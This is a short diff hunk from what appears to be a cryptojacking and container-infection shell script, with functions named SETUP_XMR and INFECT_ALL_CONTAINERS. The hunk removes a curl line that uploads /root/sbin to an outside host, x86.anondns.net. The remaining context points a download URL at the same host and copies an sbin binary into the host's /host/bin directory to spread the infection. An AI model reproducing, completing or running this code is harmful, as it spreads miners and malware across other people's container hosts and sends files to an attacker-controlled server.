@@ -108,7 +108,6 @@ function SETUP_XMR() {
 
 # Infect all containers
 function INFECT_ALL_CONTAINERS() {
-    curl -F "file=@/root/sbin" http://x86.anondns.net/transfer.php
     UPSPINTEST=http://x86.anondns.net/sbin
     mkdir -p /host/bin
     cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
